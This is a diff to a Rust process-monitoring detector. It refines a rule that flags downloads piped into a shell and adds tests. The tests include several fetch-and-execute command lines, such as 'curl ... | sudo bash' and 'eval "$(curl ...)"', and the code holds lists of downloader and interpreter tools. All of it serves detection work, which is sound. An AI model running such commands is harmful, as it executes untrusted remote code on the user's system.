@@ -16,12 +16,127 @@ use super::ioa::ProcContext;
 /// download-and-execute chain.
 const SHELLS: &[&str] = &["sh", "bash", "dash", "zsh", "ksh", "ash", "fish"];
 
-/// Network download / exfil utilities frequently abused as LOLBins.
-const DOWNLOADERS: &[&str] = &["curl", "wget", "ftp", "tftp", "nc", "ncat", "socat"];
-
 /// Interpreters that, with an inline one-liner, are a common reverse-shell or
 /// fileless-execution vector.
 const INTERPRETERS: &[&str] = &["python", "python3", "perl", "ruby", "php", "lua"];
+
+/// Whether a command line feeds downloaded content straight into a shell:
+///
+///   * a pipeline stage that is a downloader writing to stdout, directly
+///     followed by a stage that is a shell (`curl -s x | sudo bash`,
+///     `wget -qO- x | sh -s -- arg`);
+///   * a command substitution of a downloader evaluated by the shell
+///     (`eval "$(curl x)"`, `bash -c "$(wget -qO- x)"`, `source <(curl x)`).
+///
+/// Earlier versions matched substrings anywhere in the line, so a compound
+/// command that merely mentioned `curl` and later ran `… | sha256sum` or
+/// `eval` alerted (seen on a benign developer workstation recording). The
+/// pipeline is now parsed: only *adjacent* stages count.
+fn download_executes_in_shell(cmdline: &str) -> bool {
+    // Flags are case-sensitive (`curl -o` vs `-O`); tool names are not.
+    // Downloaders that write to stdout in a pipeline (nc/socat stream too).
+    const STREAMING: &[&str] = &["curl", "wget", "nc", "ncat", "socat"];
+    let first_word = |stage: &str| -> Option<String> {
+        stage
+            .split_whitespace()
+            .find(|w| {
+                !matches!(*w, "sudo" | "env" | "command" | "exec" | "nohup") && !w.contains('=')
+            })
+            .map(|w| {
+                w.trim_matches(|c| c == '(' || c == '{' || c == '"' || c == '\'')
+                    .rsplit('/')
+                    .next()
+                    .unwrap_or(w)
+                    .to_ascii_lowercase()
+            })
+    };
+    let writes_to_stdout = |tool: &str, stage: &str| -> bool {
+        let words: Vec<&str> = stage.split_whitespace().collect();
+        match tool {
+            // curl writes to stdout unless -o/-O/--output/--remote-name.
+            "curl" => !words.iter().enumerate().any(|(i, w)| {
+                (*w == "-o" || *w == "--output") && words.get(i + 1).is_some_and(|f| *f != "-")
+                    || *w == "-O"
+                    || *w == "--remote-name"
+                    || (w.starts_with("-o") && w.len() > 2 && !w.starts_with("-o-"))
+                    || w.starts_with("--output=") && *w != "--output=-"
+            }),
+            // wget writes a file unless -O - / -O- / -qO- / --output-document=-.
+            "wget" => words.iter().enumerate().any(|(i, w)| {
+                let short = w.starts_with('-') && !w.starts_with("--");
+                (short && w.ends_with("O-"))
+                    || (short && w.ends_with('O') && words.get(i + 1) == Some(&"-"))
+                    || *w == "--output-document=-"
+                    || (*w == "--output-document" && words.get(i + 1) == Some(&"-"))
+            }),
+            _ => true,
+        }
+    };
+    let is_shell = |w: &str| SHELLS.contains(&w);
+
+    // The process's own `bash -c` / `/bin/sh -lc` prefix is the shell running
+    // the script, not a pipeline stage.
+    let mut script = cmdline.trim();
+    loop {
+        let mut words = script.splitn(3, char::is_whitespace);
+        let (Some(first), Some(flag)) = (words.next(), words.next()) else {
+            break;
+        };
+        let base = first.rsplit('/').next().unwrap_or(first);
+        if is_shell(&base.to_ascii_lowercase()) && flag.starts_with('-') && flag.ends_with('c') {
+            script = words.next().unwrap_or("").trim().trim_matches(['"', '\'']);
+        } else {
+            break;
+        }
+    }
+
+    for command in script
+        .split(['\n', ';'])
+        .flat_map(|c| c.split("&&"))
+        .flat_map(|c| c.split("||"))
+    {
+        let stages: Vec<&str> = command.split('|').collect();
+        for pair in stages.windows(2) {
+            let (Some(src), Some(dst)) = (first_word(pair[0]), first_word(pair[1])) else {
+                continue;
+            };
+            if STREAMING.contains(&src.as_str())
+                && writes_to_stdout(&src, pair[0])
+                && is_shell(&dst)
+            {
+                return true;
+            }
+        }
+        // Substitution evaluated by the shell.
+        for open in ["$(", "`", "<("] {
+            let mut rest = command;
+            while let Some(i) = rest.find(open) {
+                let inner = &rest[i + open.len()..];
+                let before = rest[..i]
+                    .trim_end()
+                    .trim_end_matches(['"', '\''])
+                    .trim_end()
+                    .to_ascii_lowercase();
+                if let Some(tool) = first_word(inner) {
+                    if (tool == "curl" || tool == "wget")
+                        // At the start of a command the substitution's
+                        // output *is* the command that runs.
+                        && (before.is_empty()
+                            || before.ends_with("eval")
+                            || before.ends_with("source")
+                            || before.ends_with(" .")
+                            || before == "."
+                            || before.ends_with("-c"))
+                    {
+                        return true;
+                    }
+                }
+                rest = inner;
+            }
+        }
+    }
+    false
+}
 
 /// Inspect a process execution for suspicious command-line behaviour.
 ///
@@ -94,27 +209,19 @@ pub fn inspect_process_with(
 
     // 3. Shell invoking a downloader and piping straight into a shell
     //    (`curl http://x | bash`, `wget -O- … | sh`).
-    if SHELLS.contains(&base) {
-        let has_downloader = DOWNLOADERS.iter().any(|&d| lower.contains(d));
-        let pipes_to_shell = lower.contains("| sh")
-            || lower.contains("|sh")
-            || lower.contains("| bash")
-            || lower.contains("|bash")
-            || lower.contains("curl") && lower.contains("eval");
-        if has_downloader && pipes_to_shell {
-            return Some(DetectionData {
-                rule_id: "lolbin.download_pipe_shell".into(),
-                title: "Download piped directly into a shell".into(),
-                category: "lolbin".into(),
-                mitre_tactic: Some("TA0002 Execution".into()),
-                mitre_technique: Some("T1059.004".into()),
-                confidence: 75,
-                subject: exe.to_string(),
-                detail: format!("Shell {base} downloads and executes in one step: {cmdline}"),
-                evidence: serde_json::json!({ "cmdline": cmdline }),
-                ..Default::default()
-            });
-        }
+    if SHELLS.contains(&base) && download_executes_in_shell(cmdline) {
+        return Some(DetectionData {
+            rule_id: "lolbin.download_pipe_shell".into(),
+            title: "Download piped directly into a shell".into(),
+            category: "lolbin".into(),
+            mitre_tactic: Some("TA0002 Execution".into()),
+            mitre_technique: Some("T1059.004".into()),
+            confidence: 75,
+            subject: exe.to_string(),
+            detail: format!("Shell {base} downloads and executes in one step: {cmdline}"),
+            evidence: serde_json::json!({ "cmdline": cmdline }),
+            ..Default::default()
+        });
     }
 
     // 4. Fileless execution via memfd / /proc/self/fd.
@@ -907,6 +1014,44 @@ mod tests {
         )
         .unwrap();
         assert_eq!(d.category, "lolbin");
+    }
+
+    #[test]
+    fn download_into_shell_variants_are_detected() {
+        for cmd in [
+            "bash -c curl -s https://x/i.sh | sudo bash",
+            "sh -c wget -qO- http://x/i.sh | sh -s -- --yes",
+            "bash -c wget -O - http://x/a | bash",
+            "bash -c eval \"$(curl -fsSL https://x/i)\"",
+            "bash -c bash -c \"$(wget -qO- https://x/i)\"",
+            "bash -c source <(curl -s https://x/env)",
+            "bash -c curl https://x | /usr/bin/bash",
+        ] {
+            assert!(
+                inspect_process("bash", "/usr/bin/bash", cmd)
+                    .is_some_and(|d| d.rule_id == "lolbin.download_pipe_shell"),
+                "{cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn benign_compound_commands_are_not_download_pipe_shell() {
+        // Regression from a recorded benign session: a downloader to a file,
+        // unrelated pipes and an eval wrapper in the same command line.
+        for cmd in [
+            "/bin/bash -c source /root/.snap.sh && eval 'curl -s -o page.html https://example.com || true; ls | sort; sha256sum a | sha256sum -c'",
+            "bash -c curl -o out.json https://api/x && cat out.json | jq .",
+            "bash -c wget https://x/file.tgz && tar xzf file.tgz | sh_lint",
+            "bash -c curl -s https://x | sha256sum",
+            "bash -c curl -s https://x | shuf",
+            "bash -c echo $(curl -s https://x/ip)",
+        ] {
+            assert!(
+                inspect_process("bash", "/usr/bin/bash", cmd).is_none_or(|d| d.rule_id != "lolbin.download_pipe_shell"),
+                "{cmd}"
+            );
+        }
     }
 
     #[test]
